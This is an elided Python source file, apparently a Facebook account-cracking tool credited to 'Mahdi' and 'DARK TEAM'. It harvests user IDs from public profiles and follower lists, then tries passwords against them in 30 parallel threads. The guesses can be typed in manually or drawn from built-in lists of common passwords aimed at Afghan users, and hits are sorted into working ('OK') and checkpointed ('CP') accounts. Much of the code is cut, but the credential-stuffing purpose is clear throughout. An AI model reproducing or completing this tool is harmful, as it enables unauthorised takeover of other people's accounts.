...
def logo():
 ...
 Coded By   : {kk}Mahdi{P}, Version {kk}2{P} NOW FREE
 Updated By : {kk}DARK TEAM{P}, Github : {kk}MahdiAFG1122{P}""")
###---[ USER BARU ]---###
def newbie():
...
def pilih_login():
	...
	print(f" [{hh}2{P}] No Login '{kk}No{P}'")
...
def ya_login(n,t,c):
	...
	print(f" [{hh}4{P}] Check Hasil Akun")
	print(f" [{hh}5{P}] Back To Fridt Menu")
	ask = input(f" menu : ")
...
def crack_publik(t,c):
    ...
    akun = input(f' [{hh}<{P}] Enter Publick ID : ')
    try:
...
def crack_masal(t,c):
    ...
    try:
        bz=0
        apa = int(input(f' How Many ID Do : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
	...
	try:
		...
		for pi in bas["subscribers"]["data"]:
			try:
				...
				print('\r  Dumping ID  %s ID'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		print("\r")
		...
		exit(f" [{M}>{P}] ID Don't have Follwer")	
...
def atur_atur():
	...
	if ch in ['1','01']:
		...
		for x in dump:
			id.append(x)
	print(f"{P} ─────────────────────────────")
	cp = input(f' [{hh}!{P}] See CP ID [Ya/no]\n Pilih  : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' [{hh}!{P}] SHOW OK APk [Ya/no]\n Pilih  : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] Manual [{hh}2{P}] Combine [{hh}3{P}] OTOMATIC\n Sandi  : ')
...
def manual():
	...
	pwx = []
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] ADD 6 PASSWORDD\n Sandi  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f'  OK : {sim_ok}\n CP  : {sim_cp}')
...
def otomatis():
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['100200','500600','afgan123','kabul123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan12345']
			if len(nama)<=5:
